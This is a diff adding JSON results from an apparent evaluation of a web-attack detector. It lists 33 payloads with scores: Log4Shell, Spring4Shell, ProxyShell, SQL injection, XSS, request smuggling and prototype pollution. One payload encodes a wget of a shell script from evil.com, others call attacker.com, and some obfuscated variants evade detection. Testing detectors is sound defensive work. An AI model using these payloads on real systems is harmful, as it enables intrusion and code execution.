@@ -1,0 +1,312 @@
+{
+  "timestamp": "2026-05-04T04:41:32.956832",
+  "attack_types_tested": 7,
+  "total_payloads": 33,
+  "ml_detection": [
+    {
+      "attack_type": "log4shell",
+      "total_samples": 5,
+      "detected": 3,
+      "detection_rate": 0.6,
+      "avg_confidence": 0.5549096405178267,
+      "results": [
+        {
+          "payload": "${jndi:ldap://attacker.com/a}",
+          "detected": true,
+          "confidence": 0.6244827026603893
+        },
+        {
+          "payload": "${jndi:dns://attacker.com}",
+          "detected": true,
+          "confidence": 0.6569579005704761
+        },
+        {
+          "payload": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}",
+          "detected": false,
+          "confidence": 0.3905688188091835
+        },
+        {
+          "payload": "${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/d2dldCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2g=}",
+          "detected": true,
+          "confidence": 0.8694381042322155
+        },
+        {
+          "payload": "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attacker.com/a}",
+          "detected": false,
+          "confidence": 0.23310067631686893
+        }
+      ]
+    },
+    {
+      "attack_type": "spring4shell",
+      "total_samples": 5,
+      "detected": 5,
+      "detection_rate": 1.0,
+      "avg_confidence": 0.8159456936074655,
+      "results": [
+        {
+          "payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i",
+          "detected": true,
+          "confidence": 0.7123927468612934
+        },
+        {
+          "payload": "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
+          "detected": true,
+          "confidence": 0.6970815218093988
+        },
+        {
+          "payload": "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT",
+          "detected": true,
+          "confidence": 0.9327237821415919
+        },
+        {
+          "payload": "class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell",
+          "detected": true,
+          "confidence": 0.9102573606409459
+        },
+        {
+          "payload": "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
+          "detected": true,
+          "confidence": 0.8272730565840972
+        }
+      ]
+    },
+    {
+      "attack_type": "proxyshell",
+      "total_samples": 5,
+      "detected": 3,
+      "detection_rate": 0.6,
+      "avg_confidence": 0.6003841239330955,
+      "results": [
+        {
+          "payload": "/autodiscover/autodiscover.json?@evil.com/owa/&Email=autodiscover/autodiscover.json%3F@evil.com",
+          "detected": false,
+          "confidence": 0.2734399937624692
+        },
+        {
+          "payload": "/autodiscover/autodiscover.json?a=~1942062522&X-Rps-CAT=VgEAVAdXaW5kb3d",
+          "detected": true,
+          "confidence": 0.8184671901404718
+        },
+        {
+          "payload": "/owa/auth/x.js?a=~1942062522;var+a=new+ActiveXObject(\"WScript.Shell\");a.run(\"cmd.exe+/c+calc.exe\");",
+          "detected": false,
+          "confidence": 0.4675042268510694
+        },
+        {
+          "payload": "/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=",
+          "detected": true,
+          "confidence": 0.7719623504337394
+        },
+        {
+          "payload": "/ecp/y.js?a=~1942062522;alert(document.domain);",
+          "detected": true,
+          "confidence": 0.6705468584777277
+        }
+      ]
+    },
+    {
+      "attack_type": "novel_sqli",
+      "total_samples": 5,
+      "detected": 5,
+      "detection_rate": 1.0,
+      "avg_confidence": 0.8732230875811346,
+      "results": [
+        {
+          "payload": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+          "detected": true,
+          "confidence": 0.7605133769870249
+        },
+        {
+          "payload": "1' UNION SELECT NULL,NULL,NULL,LOAD_FILE('/etc/passwd')--",
+          "detected": true,
+          "confidence": 0.7700652777027425
+        },
+        {
+          "payload": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
+          "detected": true,
+          "confidence": 0.921300749828995
+        },
+        {
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM informati",
+          "detected": true,
+          "confidence": 1.0
+        },
+        {
+          "payload": "1' OR '1'='1' AND BENCHMARK(5000000,MD5('A'))--",
+          "detected": true,
+          "confidence": 0.9142360333869111
+        }
+      ]
+    },
+    {
+      "attack_type": "polymorphic_xss",
+      "total_samples": 5,
+      "detected": 5,
+      "detection_rate": 1.0,
+      "avg_confidence": 0.8160100333104822,
+      "results": [
+        {
+          "payload": "<img src=x onerror=\"eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))\">",
+          "detected": true,
+          "confidence": 0.951670282174825
+        },
+        {
+          "payload": "<svg/onload=alert(String.fromCharCode(88,83,83))>",
+          "detected": true,
+          "confidence": 0.8513756469748872
+        },
+        {
+          "payload": "<iframe src=\"javascript:alert(`xss`)\">",
+          "detected": true,
+          "confidence": 0.6873402687968859
+        },
+        {
+          "payload": "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
+          "detected": true,
+          "confidence": 0.7853795687607149
+        },
+        {
+          "payload": "<form><button formaction=javascript:alert(1)>CLICK",
+          "detected": true,
+          "confidence": 0.8042843998450975
+        }
+      ]
+    },
+    {
+      "attack_type": "http_smuggling",
+      "total_samples": 3,
+      "detected": 3,
+      "detection_rate": 1.0,
+      "avg_confidence": 0.8193042175340137,
+      "results": [
+        {
+          "payload": "GET / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
+          "detected": true,
+          "confidence": 0.7186517037644927
+        },
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\nQ",
+          "detected": true,
+          "confidence": 1.0
+        },
+        {
+          "payload": "GET / HTTP/1.1\r\nHost: example.com\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: cow\r\n\r\n0\r\n\r\n",
+          "detected": true,
+          "confidence": 0.7392609488375484
+        }
+      ]
+    },
+    {
+      "attack_type": "prototype_pollution",
+      "total_samples": 5,
+      "detected": 4,
+      "detection_rate": 0.8,
+      "avg_confidence": 0.6187469050174711,
+      "results": [
+        {
+          "payload": "{\"__proto__\":{\"isAdmin\":true}}",
+          "detected": true,
+          "confidence": 0.8693672239578876
+        },
+        {
+          "payload": "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}",
+          "detected": false,
+          "confidence": 0.052285280888960284
+        },
+        {
+          "payload": "user[__proto__][isAdmin]=true",
+          "detected": true,
+          "confidence": 0.7642484994661606
+        },
+        {
+          "payload": "?__proto__[isAdmin]=true",
+          "detected": true,
+          "confidence": 0.5776932071874396
+        },
+        {
+          "payload": "{\"__proto__\":{\"toString\":\"alert(1)\"}}",
+          "detected": true,
+          "confidence": 0.8301403135869074
+        }
+      ]
+    }
+  ],
+  "behavioral_detection": {
+    "log4shell": {
+      "behavioral_score": 0.7469302643268296,
+      "detected_by_behavior": true,
+      "indicators": [
+        "Rapid sequential requests",
+        "Automated tool signature",
+        "Unusual parameter patterns",
+        "Consistent timing patterns"
+      ]
+    },
+    "spring4shell": {
+      "behavioral_score": 0.7156638562514389,
+      "detected_by_behavior": true,
+      "indicators": [
+        "Rapid sequential requests",
+        "Automated tool signature",
+        "Unusual parameter patterns",
+        "Consistent timing patterns"
+      ]
+    },
+    "proxyshell": {
+      "behavioral_score": 0.6966996066657929,
+      "detected_by_behavior": false,
+      "indicators": [
+        "Rapid sequential requests",
+        "Automated tool signature",
+        "Unusual parameter patterns",
+        "Consistent timing patterns"
+      ]
+    },
+    "novel_sqli": {
+      "behavioral_score": 0.6418892193682026,
+      "detected_by_behavior": false,
+      "indicators": [
+        "Rapid sequential requests",
+        "Automated tool signature",
+        "Unusual parameter patterns",
+        "Consistent timing patterns"
+      ]
+    },
+    "polymorphic_xss": {
+      "behavioral_score": 0.8229482499440864,
+      "detected_by_behavior": true,
+      "indicators": [
+        "Rapid sequential requests",
+        "Automated tool signature",
+        "Unusual parameter patterns",
+        "Consistent timing patterns"
+      ]
+    },
+    "http_smuggling": {
+      "behavioral_score": 0.7891837226359885,
+      "detected_by_behavior": true,
+      "indicators": [
+        "Rapid sequential requests",
+        "Automated tool signature",
+        "Unusual parameter patterns",
+        "Consistent timing patterns"
+      ]
+    },
+    "prototype_pollution": {
+      "behavioral_score": 0.7162484149434737,
+      "detected_by_behavior": true,
+      "indicators": [
+        "Rapid sequential requests",
+        "Automated tool signature",
+        "Unusual parameter patterns",
+        "Consistent timing patterns"
+      ]
+    }
+  },
+  "overall_statistics": {
+    "ml_mean": 0.8571428571428571,
+    "behavioral_mean": 0.7327947620194017,
+    "ensemble_mean": 0.7949688095811294
+  }
+}
